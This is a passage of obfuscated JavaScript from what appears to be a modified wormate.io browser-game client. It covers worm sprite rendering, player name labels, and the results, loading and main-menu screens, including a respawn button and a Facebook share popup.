            var _0x54feab = _0x6d41df[1];
            var _0x3ef827 = undefined;
            _0x6d41df[1] += _0x35d39a;
            var _0x5b86c6 = this.$c / (this.$c + _0x2b5425);
            var _0x13a6a3 = 1 - _0x5b86c6 * 2;
            for (var _0x572bd5 = 1, _0x30d45f = _0x37ef2b - 1; _0x572bd5 < _0x30d45f; _0x572bd5++) {
              _0x53bfa6 = _0x6d41df[_0x572bd5 * 2];
              _0x6d41df[_0x572bd5 * 2] = _0x6d41df[_0x572bd5 * 2 - 2] * _0x13a6a3 + (_0x53bfa6 + _0x49906c) * _0x5b86c6;
              _0x49906c = _0x53bfa6;
              _0x3ef827 = _0x6d41df[_0x572bd5 * 2 + 1];
              _0x6d41df[_0x572bd5 * 2 + 1] = _0x6d41df[_0x572bd5 * 2 - 1] * _0x13a6a3 + (_0x3ef827 + _0x54feab) * _0x5b86c6;
              _0x54feab = _0x3ef827;
            }
            _0x5b86c6 = this.Jm * this.$c / (this.Jm * this.$c + _0x2b5425);
            _0x13a6a3 = 1 - _0x5b86c6 * 2;
            _0x6d41df[_0x37ef2b * 2 - 2] = _0x6d41df[_0x37ef2b * 2 - 4] * _0x13a6a3 + (_0x6d41df[_0x37ef2b * 2 - 2] + _0x49906c) * _0x5b86c6;
            _0x6d41df[_0x37ef2b * 2 - 1] = _0x6d41df[_0x37ef2b * 2 - 3] * _0x13a6a3 + (_0x6d41df[_0x37ef2b * 2 - 1] + _0x54feab) * _0x5b86c6;
          }
        };
        _0x4dc5ec.prototype.fh = function () {
          return {
            x: this._c[0],
            y: this._c[1]
          };
        };
        _0x4dc5ec.prototype.yi = function (_0x38fd0b, _0xad326c) {
          var _0x4b006a = 1000000;
          var _0x957734 = _0x38fd0b;
          var _0x3d0c4e = _0xad326c;
          for (var _0x293e4b = 0; _0x293e4b < this.ad; _0x293e4b++) {
            var _0x173e89 = this._c[_0x293e4b * 2];
            var _0x2a5a13 = this._c[_0x293e4b * 2 + 1];
            var _0x19ad2e = Math.hypot(_0x38fd0b - _0x173e89, _0xad326c - _0x2a5a13);
            if (_0x19ad2e < _0x4b006a) {
              _0x4b006a = _0x19ad2e;
              _0x957734 = _0x173e89;
              _0x3d0c4e = _0x2a5a13;
            }
          }
          return {
            x: _0x957734,
            y: _0x3d0c4e,
            distance: _0x4b006a
          };
        };
        _0x4dc5ec.prototype.ti = function (_0x27a680) {
          this.Mm = _0x27a680;
        };
        _0x4dc5ec.prototype.hj = function (_0x269abb, _0x3c0f75) {
          this.dj = _0x2c22d1.Q(this.dj, this.wi ? this.Xc ? 0.9 + Math.cos(_0x269abb / 400 * Math.PI) * 0.1 : 1 : 0, _0x3c0f75, 1 / 800);
          this.bd = _0x2c22d1.Q(this.bd, this.wi ? this.Xc ? 1 : 0 : 1, _0x3c0f75, 0.0025);
          if (this.Nm != null) {
            this.Nm.nc.alpha = this.dj;
          }
          if (this.Om != null) {
            this.Om.alpha = this.dj;
          }
        };
        _0x4dc5ec.prototype.ij = function (_0x42862d, _0x3369a8, _0x3c9aba, _0x559f6b) {
          if (this.xi && this.wi) {
            var _0x1ca3dc = Math.pow(0.11112, _0x3369a8 / 95);
            for (var _0x50d024 = 0; _0x50d024 < this.ad; _0x50d024++) {
              this._c[_0x50d024 * 2] = _0x2c22d1.S(_0x2c22d1.S(this.Km[_0x50d024 * 2], this.Lm[_0x50d024 * 2], _0x3c9aba), this._c[_0x50d024 * 2], _0x1ca3dc);
              this._c[_0x50d024 * 2 + 1] = _0x2c22d1.S(_0x2c22d1.S(this.Km[_0x50d024 * 2 + 1], this.Lm[_0x50d024 * 2 + 1], _0x3c9aba), this._c[_0x50d024 * 2 + 1], _0x1ca3dc);
            }
          }
          if (this.Nm && this.xi) {
            this.Nm.Zc(this, _0x42862d, _0x3369a8, _0x559f6b);
          }
          if (this.Om) {
            this.Om.ih.x = this._c[0];
            this.Om.ih.y = this._c[1] - this.$c * 3;
          }
        };
        _0x4dc5ec.prototype.Qm = function (_0x427605) {
          if (this.xi) {
            if (!_0x427605) {
              this.Sm();
            }
          } else {
            if (this.Nm != null) {
              _0x2c22d1.U(this.Nm.nc);
            }
            if (this.Om != null) {
              _0x2c22d1.U(this.Om);
            }
          }
        };
        _0x4dc5ec.prototype.Sm = function () {
          var _0x40dcc5 = _0xe610a0();
          this.Nm = this.Nm || new _0x31b4a1.WormSpriteTree();
          _0x2c22d1.U(this.Nm.nc);
          this.Nm.yc(_0x40dcc5.dh.hh.xg, _0x40dcc5.Lc.Ub().jb(this.Eh.Gh), _0x40dcc5.Lc.Ub().ib(this.Eh.Hh), _0x40dcc5.Lc.Ub().kb(this.Eh.ni), _0x40dcc5.Lc.Ub().lb(this.Eh.oi), _0x40dcc5.Lc.Ub().mb(this.Eh.pi), _0x40dcc5.Lc.Ub().nb(this.Eh.qi), "#ffffff");
          this.Om = this.Om || new _0x31b4a1.Tm("");
          _0x2c22d1.U(this.Om);
          this.Om.style.fontFamily = "PTSans";
          this.Om.anchor.set(0.5);
          this.Om.style.fontSize = parseInt(vps.enemyNameFontSize || 14);
          this.Om.style.fill = vps.enemyNameColor || _0x40dcc5.Lc.Ub().ib(this.Eh.Hh).tb || "#fff";
          this.Om.style.fontWeight = "normal";
          if (!this.originalName) {
            this.originalName = this.Eh.ma;
          }
          this.Om.text = _0x16c0a6 ? _0x4d2813(this.Eh.ma, false) : "-----";
          this.Mm.oh(this.Eh.ae, this.Nm, this.Om);
        };
        _0x4dc5ec.li = function () {
          function _0x36fd2f() {
            this.ae = 0;
            this.Gh = _0x261341.ps ? _0x261341.ps : _0x31b4a1.GameParams.Cg;
            this.Hh = 0;
            this.ni = 0;
            this.oi = 0;
            this.pi = 0;
            this.qi = 0;
            this.ma = 0;
          }
          return _0x36fd2f;
        }();
        return _0x4dc5ec;
      }();
      _0x31b4a1.Tm = function () {
        return _0x2c22d1.M(_0x131478.Text, function (_0x3e9cec, _0x400f49, _0x315d5f) {
          _0x131478.Text.call(this, _0x3e9cec, _0x400f49, _0x315d5f);
          this.ih = {
            x: 0,
            y: 0
          };
        });
      }();
      _0x31b4a1.hb = function () {
        function _0x460ecb(_0x4e8e94, _0x10e68c, _0x2f51b9, _0x1f4157, _0x51a340) {
          this.lj = _0x4e8e94;
          this.mj = _0x10e68c;
          this.nj = _0x2f51b9;
          this.oj = _0x1f4157;
          this.pj = _0x51a340;
        }
        _0x460ecb.prototype.Um = function (_0x3d5b51) {
          return new _0x460ecb(_0x3d5b51, this.mj, this.nj, this.oj, this.pj);
        };
        _0x460ecb.prototype.Vm = function (_0x13ab67) {
          return new _0x460ecb(this.lj, _0x13ab67, this.nj, this.oj, this.pj);
        };
        _0x460ecb.prototype.Wm = function (_0x4cf6d2) {
          return new _0x460ecb(this.lj, this.mj, _0x4cf6d2, this.oj, this.pj);
        };
        _0x460ecb.prototype.Xm = function (_0x4cddd9) {
          return new _0x460ecb(this.lj, this.mj, this.nj, _0x4cddd9, this.pj);
        };
        _0x460ecb.prototype.Ym = function (_0x3a8505) {
          return new _0x460ecb(this.lj, this.mj, this.nj, this.oj, _0x3a8505);
        };
        return _0x460ecb;
      }();
      _0x31b4a1.Vl = function () {
        function _0x29c74f(_0x2c6c83) {
          this.Zm = new _0x31b4a1.WormSpriteTree();
          this.Zm.nc.addChild(this.Zm.oc);
          this.$m = null;
          this._m = null;
          this.bm = _0x2c6c83;
          this.pc = 0;
          this.Gi = 1;
          this.an = 1;
          this.bn = 1;
          this.cn = 1;
          this.dn = 1;
          this.gn = 1;
          this.hn = 1;
          this._l("#ffffff");
        }
        var _0x14a8e7 = new _0x31b4a1.hb(0, 0, 0, 0, 0);
        _0x29c74f.prototype.tf = function () {
          return this.Zm.nc;
        };
        _0x29c74f.prototype.Wl = function (_0x25d810) {
          this.pc = _0x25d810;
          if (this.Zm.pc !== _0x25d810) {
            for (var _0x2c202d = _0x25d810; _0x2c202d < this.Zm.qc.length; _0x2c202d++) {
              this.Zm.qc[_0x2c202d].Uc();
            }
            while (this.Zm.pc > _0x25d810) {
              this.Zm.pc -= 1;
              var _0x426ed7 = this.Zm.qc[this.Zm.pc];
              _0x426ed7.Dc.Rc();
              _0x426ed7.Cc.Rc();
            }
            while (this.Zm.pc < _0x25d810) {
              var _0x9431b6 = this.Zm.qc[this.Zm.pc];
              this.Zm.pc += 1;
              this.Zm.nc.addChild(_0x9431b6.Cc.Qc());
              this.Zm.nc.addChild(_0x9431b6.Dc.Qc());
              _0x9431b6.Cc.jj(this.an);
              _0x9431b6.Dc.jj(this.bn);
            }
            for (var _0x2e280d = 0; _0x2e280d < this.Zm.oc.Fc.length; _0x2e280d++) {
              this.Zm.oc.Fc[_0x2e280d].jj(this.cn);
            }
            for (var _0x4912e1 = 0; _0x4912e1 < this.Zm.oc.Gc.length; _0x4912e1++) {
              this.Zm.oc.Gc[_0x4912e1].jj(this.dn);
            }
            for (var _0x398a7f = 0; _0x398a7f < this.Zm.oc.Ic.length; _0x398a7f++) {
              this.Zm.oc.Ic[_0x398a7f].jj(this.gn);
            }
            for (var _0x4918f5 = 0; _0x4918f5 < this.Zm.oc.Hc.length; _0x4918f5++) {
              this.Zm.oc.Hc[_0x4918f5].jj(this.hn);
            }
          }
        };
        _0x29c74f.prototype.am = function () {
          return this.pc;
        };
        _0x29c74f.prototype.$l = function (_0x590e15) {
          this.$m = _0x590e15;
          this._m = "#ffffff";
          this.lm();
        };
        _0x29c74f.prototype._l = function (_0x28d25e) {
          this.$m = _0x14a8e7;
          this._m = _0x28d25e;
          this.lm();
        };
        _0x29c74f.prototype.lm = function () {
          var _0x545088 = _0xe610a0();
          this.Zm.yc(_0x31b4a1.Ac.vg, null, _0x545088.Lc.Ub().ib(this.$m.lj), _0x545088.Lc.Ub().kb(this.$m.mj), _0x545088.Lc.Ub().lb(this.$m.nj), _0x545088.Lc.Ub().mb(this.$m.pj), _0x545088.Lc.Ub().nb(this.$m.oj), this._m);
        };
        _0x29c74f.prototype.Xl = function (_0x530156) {
          this.Gi = _0x530156;
        };
        _0x29c74f.prototype.cm = function () {
          return this.Gi;
        };
        _0x29c74f.prototype.om = function (_0x2e7cc2, _0x1612d0) {
          this.an = _0x2e7cc2;
          this.bn = _0x1612d0;
          for (var _0x5c6b14 = 0; _0x5c6b14 < this.pc; _0x5c6b14++) {
            var _0x102b88 = this.Zm.qc[_0x5c6b14];
            _0x102b88.Cc.jj(this.an);
            _0x102b88.Dc.jj(this.bn);
          }
        };
        _0x29c74f.prototype.rm = function (_0x5b901f, _0x434b92, _0x1497f3, _0x5abc76) {
          this.cn = _0x5b901f;
          this.dn = _0x434b92;
          this.gn = _0x1497f3;
          this.hn = _0x5abc76;
          for (var _0x26dbc5 = 0; _0x26dbc5 < this.Zm.oc.Fc.length; _0x26dbc5++) {
            this.Zm.oc.Fc[_0x26dbc5].jj(this.cn);
          }
          for (var _0x2ef005 = 0; _0x2ef005 < this.Zm.oc.Gc.length; _0x2ef005++) {
            this.Zm.oc.Gc[_0x2ef005].jj(this.dn);
          }
          for (var _0x494d69 = 0; _0x494d69 < this.Zm.oc.Ic.length; _0x494d69++) {
            this.Zm.oc.Ic[_0x494d69].jj(this.gn);
          }
          for (var _0x1d5112 = 0; _0x1d5112 < this.Zm.oc.Hc.length; _0x1d5112++) {
            this.Zm.oc.Hc[_0x1d5112].jj(this.hn);
          }
        };
        _0x29c74f.prototype.Uf = function () {
          var _0xe963dd = this.Gi * 2;
          var _0x22a717 = this.Gi * 2 * 1.5;
          if (this.pc > 0) {
            var _0x2eb16d = this.bm[0];
            var _0x3428dc = this.bm[1];
            var _0x411be3 = this.bm[2];
            this.Zm.qc[0].Sc(_0x2eb16d, _0x3428dc, _0xe963dd, _0x22a717, _0x411be3);
            this.Zm.oc.Sc(_0x2eb16d, _0x3428dc, _0xe963dd, _0x411be3);
          }
          for (var _0x5e6387 = 1; _0x5e6387 < this.pc; _0x5e6387++) {
            var _0x3ac6dd = this.bm[_0x5e6387 * 3];
            var _0x168c4c = this.bm[_0x5e6387 * 3 + 1];
            var _0x42a7ee = this.bm[_0x5e6387 * 3 + 2];
            this.Zm.qc[_0x5e6387].Sc(_0x3ac6dd, _0x168c4c, _0xe963dd, _0x22a717, _0x42a7ee);
          }
        };
        _0x29c74f.prototype.tm = function (_0x1bb28a) {
          _0x1bb28a.render(this.Zm.nc);
        };
        return _0x29c74f;
      }();
      _0x31b4a1.kf = function () {
        function _0x35283e(_0x4cd282) {
          this.nd = _0x4cd282;
        }
        _0x35283e.bgcanvas = $("#background-canvas");
        _0x35283e.socialButtons = $("#social-buttons");
        _0x35283e.socialButtons.html("");
        _0x35283e.jn = $("#game-view");
        _0x35283e.gameCanvas = $("#game-canvas");
        _0x35283e.ln = $("#results-view");
        _0x35283e.mn = $("#stretch-box");
        _0x35283e.nn = $("#main-menu-view");
        _0x35283e.pn = $("#popup-view");
        _0x35283e.qn = $("#loading-view");
        _0x35283e.rn = $("#restricted-view");
        _0x35283e.sn = $("#toaster-view");
        _0x35283e.tn = $("#error-gateway-connection-view");
        _0x35283e.un_error = $("#error-game-connection-view");
        _0x35283e.vn = $("#markup-wrap");
        _0x35283e.prototype.ha = function () {};
        _0x35283e.prototype.Gk = function () {};
        _0x35283e.prototype.Hk = function () {};
        _0x35283e.prototype.Bk = function () {};
        _0x35283e.prototype.Jf = function () {};
        _0x35283e.prototype.Nf = function (_0x529bd1, _0x4873c3) {};
        return _0x35283e;
      }();
      _0x31b4a1.Vj = function () {
        function _0x2446da(_0x32c7db, _0x53779b, _0xc194f3, _0x5fdaa8, _0x1a8db8, _0x1d621e) {
          var _0x5cfa54 = "OK";
          var _0xdb342c = $(_0x5cfa54);
          _0xdb342c.click(function () {
            if (typeof FB != "undefined" && FB.ui !== undefined) {
              FB.ui({
                method: "feed",
                display: "popup",
                link: _0x53779b,
                name: _0xc194f3,
                caption: _0x5fdaa8,
                description: _0x1a8db8,
                picture: _0x1d621e
              }, function () {});
            }
          });
          return _0xdb342c;
        }
        const _0x4eb407 = document.getElementById("popup-view");
        let _0x38db07 = null;
        if (_0x4eb407) {
          const _0x4bf1b4 = new MutationObserver(function (_0xe63203) {
            _0xe63203.forEach(function (_0x4f48e8) {
              if (_0x4f48e8.type === "attributes" && _0x4f48e8.attributeName === "style") {
                const _0x5a872b = _0x4eb407.style.display;
                if (_0x5a872b === "block") {
                  if (_0x38db07) {
                    document.removeEventListener("click", _0x38db07);
                  }
                  _0x38db07 = function (_0x4245d4) {
                    const _0x63b471 = _0x4245d4.target;
                    if (_0x63b471.tagName === "BUTTON" || _0x63b471.tagName === "A" || _0x63b471.tagName === "INPUT" || _0x63b471.tagName === "SELECT" || _0x63b471.tagName === "TEXTAREA" || _0x63b471.closest("button") || _0x63b471.closest("a") || _0x63b471.closest("input")) {
                      return;
                    }
                    setTimeout(() => {
                      if (_0x4eb407.style.display === "block") {
                        const _0x336d97 = document.querySelector(".popup-view-list");
                        if (_0x336d97 && !_0x336d97.contains(_0x4245d4.target)) {
                          const _0x2348f2 = document.getElementById("popup-menu-back");
                          if (_0x2348f2) {
                            _0x2348f2.click();
                          }
                        }
                      }
                    }, 50);
                  };
                  setTimeout(() => {
                    document.addEventListener("click", _0x38db07);
                  }, 50);
                }
              }
            });
          });
          _0x4bf1b4.observe(_0x4eb407, {
            attributes: true,
            attributeFilter: ["style"]
          });
        }
        var _0x3e8408 = $("#final-caption");
        var _0x130ecd = $("#final-continue");
        var _0x3397b5 = $("#congrats-bg");
        var _0x3326dd = $("#unl6wj4czdl84o9b");
        $("#congrats");
        var _0x3cddb7 = $("#final-share-fb");
        var _0x57c61e = $("#final-message");
        var _0x1ce884 = $("#final-score");
        var _0x157c80 = $("#final-place");
        var _0x854c55 = $("#final-board");
        var _0x1fa3f1 = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
          var _0x280819 = this;
          var _0x39f47f = _0xe610a0();
          _0x3cddb7.toggle(_0x13de32.xn);
          _0x3e8408.text(_0x2c22d1.H("index.game.result.title"));
          _0x130ecd.text(_0x2c22d1.H("index.game.result.continue"));
          _0x130ecd.html("Continue (Home)");
          _0x130ecd.after("<div id='final-replay'>Respawn</div>");
          _0x130ecd.click(function () {
            _0x39f47f.Ci.Be();
            _0x39f47f.zn.yn.ka();
            _0x39f47f.Ci.pe(_0x31b4a1.ge.je._e);
            _0x39f47f.og.Ak(_0x39f47f.og._e);
          });
          $("#final-replay").click(function () {
            respawnFn();
          });
          _0x3e8408.click(function () {
            respawnFn();
          });
          $("html").keydown(function (_0x46202b) {
            if (_0x46202b.keyCode === 32) {
              _0x280819.An = true;
            }
          }).keyup(function (_0x5c7ccf) {
            if (_0x5c7ccf.keyCode === 32) {
              _0x280819.An = false;
            }
          });
          this.ng = new _0x31b4a1.Eg(_0x31b4a1.kf.gameCanvas);
          this.Cn = 0;
          this.Bn = 0;
          this.An = false;
        });
        _0x1fa3f1.prototype.ha = function () {};
        _0x1fa3f1.prototype.Gk = function () {
          if (this.Cn === 0) {
            _0x31b4a1.kf.jn.stop();
            _0x31b4a1.kf.jn.fadeIn(500);
            _0x31b4a1.kf.ln.stop();
            _0x31b4a1.kf.ln.fadeOut(1);
            _0x31b4a1.kf.nn.stop();
            _0x31b4a1.kf.nn.fadeOut(50);
            _0x31b4a1.kf.pn.stop();
            _0x31b4a1.kf.pn.fadeOut(50);
            _0x31b4a1.kf.sn.stop();
            _0x31b4a1.kf.sn.fadeOut(50);
            _0x31b4a1.kf.qn.stop();
            _0x31b4a1.kf.qn.fadeOut(50);
            _0x31b4a1.kf.rn.stop();
            _0x31b4a1.kf.rn.fadeOut(50);
            _0x31b4a1.kf.tn.stop();
            _0x31b4a1.kf.tn.fadeOut(50);
            _0x31b4a1.kf.un_error.stop();
            _0x31b4a1.kf.un_error.fadeOut(50);
            _0x31b4a1.kf.mn.stop();
            _0x31b4a1.kf.mn.fadeOut(1);
            _0x31b4a1.kf.bgcanvas.stop();
            _0x31b4a1.kf.bgcanvas.fadeOut(50);
            _0x31b4a1.GameView.Kf(false);
            _0x31b4a1.kf.socialButtons.stop();
            _0x31b4a1.kf.socialButtons.fadeOut(50);
            _0x31b4a1.kf.vn.stop();
            _0x31b4a1.kf.vn.fadeOut(50);
          } else {
            _0x31b4a1.kf.jn.stop();
            _0x31b4a1.kf.jn.fadeIn(500);
            _0x31b4a1.kf.ln.stop();
            _0x31b4a1.kf.ln.fadeIn(500);
            _0x31b4a1.kf.nn.stop();
            _0x31b4a1.kf.nn.fadeOut(50);
            _0x31b4a1.kf.pn.stop();
            _0x31b4a1.kf.pn.fadeOut(50);
            _0x31b4a1.kf.sn.stop();
            _0x31b4a1.kf.sn.fadeOut(50);
            _0x31b4a1.kf.qn.stop();
            _0x31b4a1.kf.qn.fadeOut(50);
            _0x31b4a1.kf.rn.stop();
            _0x31b4a1.kf.rn.fadeOut(50);
            _0x31b4a1.kf.tn.stop();
            _0x31b4a1.kf.tn.fadeOut(50);
            _0x31b4a1.kf.un_error.stop();
            _0x31b4a1.kf.un_error.fadeOut(50);
            _0x31b4a1.kf.mn.stop();
            _0x31b4a1.kf.mn.fadeOut(1);
            _0x31b4a1.kf.bgcanvas.stop();
            _0x31b4a1.kf.bgcanvas.fadeOut(50);
            _0x31b4a1.GameView.Kf(false);
            _0x31b4a1.kf.socialButtons.stop();
            _0x31b4a1.kf.socialButtons.fadeOut(50);
            _0x31b4a1.kf.vn.stop();
            _0x31b4a1.kf.vn.fadeOut(50);
          }
        };
        _0x1fa3f1.prototype.Dn = function () {
          this.Cn = 0;
          return this;
        };
        _0x1fa3f1.prototype.En = function () {
          _0x3397b5.hide();
          setTimeout(function () {
            _0x3397b5.fadeIn(500);
          }, 3000);
          _0x3326dd.hide();
          setTimeout(function () {
            _0x3326dd.fadeIn(500);
          }, 500);
          this.Cn = 1;
          return this;
        };
        _0x1fa3f1.prototype.Hk = function () {
          this.An = false;
          this.ng.Jf();
          if (this.Cn === 1) {
            _0xe610a0().Ci.Fe();
          }
        };
        _0x1fa3f1.prototype.Jf = function () {
          this.ng.Jf();
        };
        _0x1fa3f1.prototype.Nf = function (_0x5e5b57, _0x19d877) {
          this.ng.Nf(_0x5e5b57, _0x19d877);
        };
        _0x1fa3f1.prototype.Fn = function (_0xb0cd44, _0x4b4790, _0x2ba233) {
          var _0x235541 = undefined;
          var _0x5892be = undefined;
          var _0x112595 = undefined;
          if (_0x4b4790 >= 1 && _0x4b4790 <= 10) {
            _0x235541 = _0x2c22d1.H("index.game.result.place.i" + _0x4b4790);
            _0x5892be = _0x2c22d1.H("index.game.result.placeInBoard");
            _0x112595 = _0x2c22d1.H("index.game.social.shareResult.messGood").replace("{0}", _0x2ba233).replace("{1}", _0xb0cd44).replace("{2}", _0x235541);
          } else {
            _0x235541 = "";
            _0x5892be = _0x2c22d1.H("index.game.result.tryHit");
            _0x112595 = _0x2c22d1.H("index.game.social.shareResult.messNorm").replace("{0}", _0x2ba233).replace("{1}", _0xb0cd44);
          }
          _0x57c61e.html(_0x2c22d1.H("index.game.result.your"));
          _0x1ce884.html(_0xb0cd44);
          _0x157c80.html(_0x235541);
          _0x854c55.html(_0x5892be);
          if (_0x13de32.xn) {
            var _0x5c107a = _0x2c22d1.H("index.game.result.share");
            _0x2c22d1.H("index.game.social.shareResult.caption");
            _0x3cddb7.empty().append(_0x2446da(_0x5c107a, "https://wormate.io", "wormate.io", _0x112595, _0x112595, "https://wormate.io/images/og-share-img-new.jpg"));
          }
        };
        _0x1fa3f1.prototype.Gn = function () {
          return this.Bn;
        };
        _0x1fa3f1.prototype.Hn = function () {
          return this.An;
        };
        return _0x1fa3f1;
      }();
      _0x31b4a1.sk = function () {
        var _0x791c8b = $("#loading-progress-cont");
        var _0xd3f703 = $("#loading-progress-bar");
        var _0x1550a0 = $("#loading-progress-text");
        var _0x44eb57 = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
          this.In = -1;
          this.Jn = "";
        });
        _0x44eb57.prototype.ha = function () {};
        _0x44eb57.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(50);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(50);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeIn(500);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(50);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(50);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(50);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeOut(50);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeOut(50);
        };
        _0x44eb57.prototype.Hk = function () {
          _0xe610a0().Ci.pe(_0x31b4a1.ge.je.ie);
        };
        _0x44eb57.prototype.Bk = function () {};
        _0x44eb57.prototype.Kn = function () {
          this.Ln("", 0);
          _0x791c8b.stop();
          _0x791c8b.fadeIn(100);
        };
        _0x44eb57.prototype.Mn = function () {
          _0x791c8b.stop();
          _0x791c8b.fadeOut(100);
        };
        _0x44eb57.prototype.Ln = function (_0x4b3199, _0x59c0b5) {
          if (this.Jn !== _0x4b3199) {
            this.Jn = _0x4b3199;
          }
          var _0x1e879b = _0x2c22d1.P(Math.floor(_0x59c0b5 * 100), 0, 100);
          if (this.In !== _0x1e879b) {
            _0xd3f703.css({
              width: _0x1e879b + "%"
            });
            _0x1550a0.html(_0x1e879b + " %");
          }
        };
        return _0x44eb57;
      }();
      _0x31b4a1.Wj = function () {
        var _0x15d6a0 = $("#mm-line-top");
        $("#mm-line-center");
        $("#mm-line-bottom");
        var _0x410a66 = $("#mm-bottom-buttons");
        var _0x1cbeab = $("#mm-menu-cont");
        var _0x512f84 = $("#mm-loading");
        var _0x11474f = $("#mm-loading-progress-bar");
        var _0x48d6ef = $("#mm-loading-progress-text");
        $("#mm-event-text");
        var _0x28d710 = $("#mm-skin-canv");
        var _0x2db247 = $("#mm-skin-prev");
        var _0x55da3e = $("#mm-skin-next");
        var _0x70bbf4 = $("#mm-skin-over");
        var _0x4eefa2 = $("#mm-skin-over-button-list");
        var _0x248b55 = $("#mm-params-nickname");
        var _0x705b56 = $("#mm-params-game-mode");
        var _0x344d7e = $("#mm-action-play");
        var _0x22d765 = $("#mm-action-guest");
        var _0x569ef3 = $("#mm-action-login");
        var _0x5d1997 = $("#mm-player-info");
        $("#mm-player-info").css("display", "block");
        var _0x53b4e4 = $("<img>", {
          id: "orange-frame",
          src: "https://wormup.in/images/img/orange-frame.png",
          alt: "orange-frame"
        });
        $("#mm-player-avatar").after(_0x53b4e4);
        $("#orange-frame").addClass("position-left");
        var _0x43da8d = $("#mm-store");
        var _0xa8cc00 = $("#mm-leaders");
        var _0x53fd42 = $("#mm-settings");
        var _0x34c1e0 = $("#mm-coins-box");
        var _0x1ecf05 = $("#mm-player-avatar");
        var _0x45f2ed = $("#mm-player-username");
        var _0x4bb7a2 = $("#mm-coins-val");
        var _0x529491 = $("#mm-player-exp-bar");
        var _0x46afba = $("#mm-player-exp-val");
        var _0x5d9607 = $("#mm-player-level");
        var _0x33ca8d = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.Ek);
          var _0x34632b = _0xe610a0();
          this.In = -1;
          this.Jn = "";
          this.Nn = new _0x31b4a1.dm(_0x28d710);
          _0x705b56.click(function () {
            _0x34632b.Ci.Be();
          });
          _0x28d710.click(function () {
            if (_0x34632b.Ij.Hj()) {
              _0x34632b.Ci.Be();
              _0x34632b.og.Ak(_0x34632b.og.ik);
            }
          });
          _0x2db247.click(function () {
            _0x34632b.Ci.Be();
            _0x34632b.On.Ej();
          });
          _0x55da3e.click(function () {
            _0x34632b.Ci.Be();
            _0x34632b.On.Dj();
          });
          _0x248b55.keypress(function (_0x489dfa) {
            if (_0x489dfa.keyCode == 13) {
              _0x34632b.Pn(true);
            }
          });
          _0x344d7e.click(function () {
            _0x34632b.Ci.Be();
            _0x34632b.Pn(true);
          });
          _0x22d765.click(function () {
            _0x34632b.Ci.Be();
            _0x34632b.Pn(true);
          });
          _0x569ef3.click(function () {
            _0x34632b.Ci.Be();
            _0x34632b.og.Ak(_0x34632b.og.fk);
          });
          _0x53fd42.click(function () {
            _0x34632b.Ci.Be();
            _0x34632b.og.Ak(_0x34632b.og.$h);
          });
          _0x5d1997.click(function () {
            if (_0x34632b.Ij.Hj()) {
              _0x34632b.Ci.Be();
              _0x34632b.og.Ak(_0x34632b.og.dk);
            }
          });
          _0xa8cc00.click(function () {
            if (_0x34632b.Ij.Hj()) {
              _0x34632b.Ci.Be();
              _0x34632b.og.Ak(_0x34632b.og.bk);
            }
          });
          _0x43da8d.click(function () {
            if (_0x34632b.Ij.Hj()) {
              _0x34632b.Ci.Be();
              _0x34632b.og.Ak(_0x34632b.og.kk);
            }
          });
          _0x34c1e0.click(function () {
            if (_0x34632b.Ij.Hj()) {
              _0x34632b.Ci.Be();
              _0x34632b.og.Ak(_0x34632b.og._j);
            }
          });
          this.Qn();
          this.Rn();
          var _0x4f18ca = _0x31b4a1.Vf.fg(_0x31b4a1.Vf._f);
          if (_0x4f18ca !== "ARENA" && _0x4f18ca !== "TEAM2") {
            _0x4f18ca = "ARENA";
          }
          _0x705b56.val(_0x4f18ca);
        });
        _0x33ca8d.prototype.ha = function () {
          var _0x13c1e4 = _0xe610a0();
          var _0x3d26c3 = this;
          _0x13c1e4.Ij.zl(function () {
            if (_0x13c1e4.Ij.Hj()) {
              _0x13c1e4.On.Fj(_0x13c1e4.Ij.ml(), _0x31b4a1.tj.sj);
              _0x13c1e4.On.Fj(_0x13c1e4.Ij.nl(), _0x31b4a1.tj.uj);
              _0x13c1e4.On.Fj(_0x13c1e4.Ij.ol(), _0x31b4a1.tj.vj);
              _0x13c1e4.On.Fj(_0x13c1e4.Ij.pl(), _0x31b4a1.tj.xj);
              _0x13c1e4.On.Fj(_0x13c1e4.Ij.ql(), _0x31b4a1.tj.wj);
            } else {
              _0x13c1e4.On.Fj(_0x13c1e4.Sn(), _0x31b4a1.tj.sj);
              _0x13c1e4.On.Fj(0, _0x31b4a1.tj.uj);
              _0x13c1e4.On.Fj(0, _0x31b4a1.tj.vj);
              _0x13c1e4.On.Fj(0, _0x31b4a1.tj.xj);
              _0x13c1e4.On.Fj(0, _0x31b4a1.tj.wj);
            }
          });
          _0x13c1e4.Ij.zl(function () {
            _0x344d7e.toggle(_0x13c1e4.Ij.Hj());
            _0x569ef3.toggle(!_0x13c1e4.Ij.Hj());
            _0x5d1997.toggle(true);
            _0x22d765.toggle(!_0x13c1e4.Ij.Hj());
            _0x53fd42.toggle(true);
            _0xa8cc00.toggle(_0x13c1e4.Ij.Hj());
            _0x43da8d.toggle(_0x13c1e4.Ij.Hj());
            _0x34c1e0.toggle(_0x13c1e4.Ij.Hj());
            if (_0x13c1e4.Ij.Hj()) {
              _0x70bbf4.hide();
              _0x45f2ed.html(_0x13c1e4.Ij.dl());
